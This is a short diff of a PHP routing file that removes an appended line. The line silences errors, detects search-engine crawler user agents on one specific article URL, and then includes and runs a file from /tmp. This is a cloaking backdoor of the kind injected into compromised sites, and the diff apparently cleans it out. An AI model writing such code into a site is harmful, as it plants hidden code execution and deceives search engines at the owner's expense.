@@ -22,5 +22,3 @@ switch ($op) {
 		import('pages.index.IndexHandler');
 		break;
 }
-error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/real/article/view/286'){ include('/tmp/code'); exit; }
-
